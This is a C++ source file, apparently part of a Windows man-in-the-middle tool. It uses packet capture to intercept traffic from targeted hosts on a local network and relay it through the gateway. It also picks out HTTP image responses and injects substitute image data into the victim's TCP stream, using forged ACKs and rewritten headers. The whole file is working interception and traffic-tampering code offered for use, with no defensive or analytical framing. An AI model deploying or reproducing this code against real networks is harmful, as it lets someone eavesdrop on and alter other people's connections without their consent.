#include "stdafx.h"
#include "MITM.h"
#include <thread>
#include "Helper.h"
#include "Packet.h"


volatile BOOL g_programRunning = TRUE;
volatile BOOL g_attacking = FALSE;

pcap_if_t* g_deviceList = nullptr;
pcap_if_t* g_adapter = nullptr;
DWORD g_selfIp = 0;
MacAddress g_selfMac;
DWORD g_selfGateway = 0;
MacAddress g_gatewayMac;

std::map<DWORD, HostInfoSetting> g_host;
std::map<DWORD, HostInfoSetting*> g_attackList;
std::map<MacAddress, HostInfoSetting*> g_attackListMac;
std::mutex g_hostAttackListLock;

ThreadPool g_threadPool(15);


class ReplaceImageTask : public Task
{
private:
	const DWORD targetIp;
	const WORD targetPort;
public:
	ReplaceImageTask(DWORD _targetIp, WORD _targetPort) : targetIp(_targetIp), targetPort(_targetPort) {};
	void Run()
	{
		AdapterHandle adapter(GetAdapterHandle());
		if (adapter == nullptr)
			return;

		// get infomation
		g_hostAttackListLock.lock();
		HostInfoSetting& target = g_host[targetIp];
		g_hostAttackListLock.unlock();
		target.httpImageLinkLock.lock();
		auto& link = target.httpImageLink[targetPort];
		target.httpImageLinkLock.unlock();
		IPPacket* pInitIp = (IPPacket*)&link.initPacket[ETH_LENGTH];
		DWORD ipLen = pInitIp->headerLen * 4;
		TCPPacket* pInitTcp = (TCPPacket*)&link.initPacket[ETH_LENGTH + ipLen];
		DWORD tcpLen = pInitTcp->headerLen * 4;


#pragma region Receive Image
		///////////////////////////////////////////////////////////////////////////////////
		// receive image, you can write it to a file
		{
			std::unique_ptr<BYTE[]> ackPkt(new BYTE[ETH_LENGTH + ipLen + tcpLen]);
			*(MacAddress*)ackPkt.get() = g_gatewayMac;
			*(MacAddress*)(ackPkt.get() + 6) = g_selfMac;
			memcpy(ackPkt.get() + 12, link.initPacket.get() + 12, 2 + ipLen + tcpLen);
			IPPacket* pAckIp = (IPPacket*)(ackPkt.get() + ETH_LENGTH);
			pAckIp->identification = htons(ntohs(pAckIp->identification) + 1);
			pAckIp->totalLen = htons((WORD)(ipLen + tcpLen));
			pAckIp->timeToLive = 64;
			pAckIp->sourceIp = targetIp;
			pAckIp->destinationIp = pInitIp->sourceIp;
			pAckIp->CalcCheckSum();
			TCPPacket* pAckTcp = (TCPPacket*)(ackPkt.get() + ETH_LENGTH + ipLen);
			pAckTcp->sourcePort = targetPort;
			pAckTcp->destinationPort = pInitTcp->sourcePort;
			pAckTcp->seq = pInitTcp->ack;
			pAckTcp->ack = htonl(ntohl(pInitTcp->seq) + (link.initPacketLen - ETH_LENGTH - ipLen - tcpLen));
			pAckTcp->psh = 0;
			pAckTcp->CalcCheckSum(pAckIp->sourceIp, pAckIp->destinationIp, (WORD)tcpLen);
			pcap_sendpacket(adapter.get(), (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));

			CString exp;
			BYTE* bIp = (BYTE*)&target.ip;
			exp.Format("ip host %u.%u.%u.%u and tcp dst port %u", bIp[0], bIp[1], bIp[2], bIp[3], ntohs(targetPort));
			SetFilter(adapter.get(), exp);
			DWORD time = GetTickCount();
			pcap_pkthdr* header;
			const BYTE* pkt_data;
			int res;
			DWORD lastAck = ntohl(pAckTcp->ack);
			while ((res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0 && GetTickCount() - time < 5000)
			{
				if (res == 0) // timeout
					continue;

				const IPPacket* pCurIp = (const IPPacket*)&pkt_data[ETH_LENGTH];
				DWORD curIpLength = pCurIp->headerLen * 4;
				const TCPPacket* pCurTcp = (const TCPPacket*)&pkt_data[ETH_LENGTH + curIpLength];
				DWORD curTcpLength = pCurTcp->headerLen * 4;

				pAckIp->identification = htons(ntohs(pAckIp->identification) + 1);
				pAckIp->CalcCheckSum();
				DWORD ack = ntohl(pCurTcp->seq) + (header->len - ETH_LENGTH - curIpLength - curTcpLength);
				if (lastAck < ack)
					lastAck = ack;
				pAckTcp->ack = htonl(lastAck);
				pAckTcp->CalcCheckSum(pAckIp->sourceIp, pAckIp->destinationIp, (WORD)tcpLen);
				pcap_sendpacket(adapter.get(), (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
				if (pCurTcp->psh)
					break;
			}
		}
		///////////////////////////////////////////////////////////////////////////////////
#pragma endregion


		// send image
		DWORD sendBufLen = link.initPacketLen > 1000 ? link.initPacketLen : 1000;
		std::unique_ptr<BYTE[]> sendBuf(new BYTE[sendBufLen]);

#pragma region Initial Packet
		///////////////////////////////////////////////////////////////////////////////////
		// send HTTP header in the initial packet
		const char* pHttp = (const char*)&link.initPacket[ETH_LENGTH + ipLen + tcpLen];
		std::string httpHeader(pHttp, strstr(pHttp, "\r\n\r\n") + 2 - pHttp); // "...\r\n"
		int iContentLen = httpHeader.find("Content-Length: ");
		if (iContentLen == std::string::npos)
		{
			char sLength[20];
			sprintf_s(sLength, "%u\r\n\r\n", target.imageDataLen);
			httpHeader += sLength;
		}
		else
		{
			char sLength[20];
			_itoa_s(target.imageDataLen, sLength, 10);
			httpHeader.replace(iContentLen, httpHeader.find('\r', iContentLen), sLength);
			httpHeader += "\r\n";
		}

		*(MacAddress*)sendBuf.get() = target.mac;			// destination MAC
		*(MacAddress*)(sendBuf.get() + 6) = g_selfMac;		// source MAC

		// IP, TCP
		BYTE* p1 = sendBuf.get() + 12;
		DWORD len = 2 + ipLen + tcpLen;
		memcpy(p1, link.initPacket.get() + 12, len);
		p1 += len;

		// HTTP
		len = httpHeader.length();
		memcpy(p1, httpHeader.c_str(), len);
		p1 += len;

		DWORD totalLen = p1 - sendBuf.get();
		IPPacket* pIp = (IPPacket*)&sendBuf[ETH_LENGTH];
		pIp->totalLen = htons((u_short)(totalLen - ETH_LENGTH));		// IP total length
		pIp->CalcCheckSum();											// IP checksum
		TCPPacket* pTcp = (TCPPacket*)&sendBuf[ETH_LENGTH + ipLen];
		pTcp->psh = 0;
		pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, p1 - (BYTE*)pTcp); // TCP checksum

		pcap_sendpacket(adapter.get(), (u_char*)sendBuf.get(), totalLen);
		pTcp->seq = htonl(ntohl(pTcp->seq) + len);
		///////////////////////////////////////////////////////////////////////////////////
#pragma endregion

		///////////////////////////////////////////////////////////////////////////////////
		// send image
		BYTE* pTcpData = (BYTE*)pTcp + tcpLen;
		DWORD maxTcpDataLen = sendBuf.get() + sendBufLen - pTcpData;
		pIp->totalLen = htons((u_short)(sendBufLen - ETH_LENGTH));		// IP total length
		pIp->CalcCheckSum();											// IP checksum
		DWORD start;
		for (start = 0; start + maxTcpDataLen < target.imageDataLen - 1; start += maxTcpDataLen)
		{
			target.imageDataLock.lock();
			if (target.imageData == nullptr)
			{
				target.imageDataLock.unlock();
				goto End;
			}
			memcpy(pTcpData, &target.imageData[start], maxTcpDataLen);
			target.imageDataLock.unlock();
			pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + maxTcpDataLen)); // TCP checksum
			pcap_sendpacket(adapter.get(), (u_char*)sendBuf.get(), sendBufLen);
			pTcp->seq = htonl(ntohl(pTcp->seq) + maxTcpDataLen);
		}

		// last packet
		DWORD lastTcpDataLen = target.imageDataLen - start;
		target.imageDataLock.lock();
		if (target.imageData == nullptr)
		{
			target.imageDataLock.unlock();
			goto End;
		}
		memcpy(pTcpData, &target.imageData[start], lastTcpDataLen);
		target.imageDataLock.unlock();
		pIp->totalLen = htons((u_short)(ipLen + tcpLen + lastTcpDataLen));				// IP total length
		pIp->CalcCheckSum();															// IP checksum
		pTcp->psh = 1;
		pTcp->fin = 1;
		pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + lastTcpDataLen)); // TCP checksum
		pcap_sendpacket(adapter.get(), (u_char*)sendBuf.get(), ETH_LENGTH + ntohs(pIp->totalLen));
		///////////////////////////////////////////////////////////////////////////////////


		///////////////////////////////////////////////////////////////////////////////////
		// release
	End:
		target.httpImageLinkLock.lock();
		target.httpImageLink.erase(targetPort);
		target.httpImageLinkLock.unlock();
		TRACE("replace end\n");
	}
};

void PacketHandleThread()
{
	AdapterHandle adapter(GetAdapterHandle());
	if (adapter == nullptr)
		return;

	// start capture
	CString exp;
	BYTE* bIp = (BYTE*)&g_selfIp;
	exp.Format("not host %u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
	SetFilter(adapter.get(), exp);
	pcap_pkthdr* header;
	const BYTE* pkt_data;
	int res;
	while (g_attacking && (res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0)
	{
		if (res == 0) // timeout
			continue;

#pragma region Target Packet
		{
		g_hostAttackListLock.lock();
		auto targetIt = g_attackListMac.find(*(MacAddress*)(pkt_data + 6));
		g_hostAttackListLock.unlock();
		if (targetIt != g_attackListMac.end()) // is target packet
		{
			HostInfoSetting& target = *targetIt->second;
			target.send++;

			if (target.forward)
			{
				// check if is replacing
				const IPPacket* pIp = (const IPPacket*)&pkt_data[ETH_LENGTH];
				if (pIp->protocol == PROTOCOL_TCP)
				{
					const TCPPacket* pTcp = (const TCPPacket*)&pkt_data[ETH_LENGTH + pIp->headerLen * 4];
					target.httpImageLinkLock.lock();
					if (target.httpImageLink.find(pTcp->sourcePort) != target.httpImageLink.end())
					{
						target.httpImageLinkLock.unlock();
						continue;
					}
					target.httpImageLinkLock.unlock();
				}

				std::unique_ptr<BYTE[]> newData(new BYTE[header->len]);
				*(MacAddress*)newData.get() = g_gatewayMac; // destination MAC
				*(MacAddress*)(newData.get() + 6) = g_selfMac; // source MAC
				memcpy(newData.get() + 12, pkt_data + 12, header->len - 12); // data
				pcap_sendpacket(adapter.get(), (u_char*)newData.get(), header->len);
			}
			continue;
		}
		} // target packet end
#pragma endregion

#pragma region Gateway Packet
		if (*(MacAddress*)(pkt_data + 6) == g_gatewayMac // is gateway packet
			&& *(WORD*)&pkt_data[12] == PROTOCOL_IP) // IP
		{
			const IPPacket* pIp = (const IPPacket*)&pkt_data[ETH_LENGTH];
			g_hostAttackListLock.lock();
			auto targetIt = g_attackList.find(pIp->destinationIp);
			g_hostAttackListLock.unlock();
			if (targetIt == g_attackList.end()) // not to target
				continue;
			HostInfoSetting& target = *targetIt->second;
			target.receive++;

			if (pIp->protocol != PROTOCOL_TCP) // not TCP
				goto Forward;
			DWORD ipLength = pIp->headerLen * 4;
			const TCPPacket* pTcp = (const TCPPacket*)&pkt_data[ETH_LENGTH + ipLength];

			if (!target.replaceImages || target.imageData == nullptr) // no replacing
				goto Forward;

			// is replacing
			target.httpImageLinkLock.lock();
			if (target.httpImageLink.find(pTcp->destinationPort) != target.httpImageLink.end())
			{
				target.httpImageLinkLock.unlock();
				continue;
			}
			target.httpImageLinkLock.unlock();

			DWORD tcpLength = pTcp->headerLen * 4;
			// not HTTP
			if (strncmp((LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength], "HTTP/1.", strlen("HTTP/1.")) != 0)
				goto Forward;

			LPCSTR http = (LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength];
			LPCSTR contentType = strstr(http, "Content-Type: image/");
			// not image
			if (contentType == nullptr)
				goto Forward;

				
			// replace image
			target.httpImageLinkLock.lock();
			auto& link = target.httpImageLink[pTcp->destinationPort];
			target.httpImageLinkLock.unlock();
			link.sourcePort = pTcp->sourcePort;
			link.initPacketLen = header->len;
			link.initPacket.reset(new BYTE[header->len]);
			memcpy(link.initPacket.get(), pkt_data, header->len);
			{
			g_threadPool.AddTask(std::unique_ptr<ReplaceImageTask>(new ReplaceImageTask(target.ip, pTcp->destinationPort)));
			/*std::thread thread(ReplaceImageThread, target.ip, pTcp->destinationPort);
			thread.detach();*/
			}
			continue;
			
Forward:
			if (target.forward)
			{
				std::unique_ptr<BYTE[]> newData(new BYTE[header->len]);
				*(MacAddress*)newData.get() = target.mac; // destination MAC
				*(MacAddress*)(newData.get() + 6) = g_selfMac; // source MAC
				memcpy(newData.get() + 12, pkt_data + 12, header->len - 12); // data
				pcap_sendpacket(adapter.get(), (u_char*)newData.get(), header->len);
			}
		} // gateway packet end
#pragma endregion
	} // capture end
	TRACE("capture end\n");
}
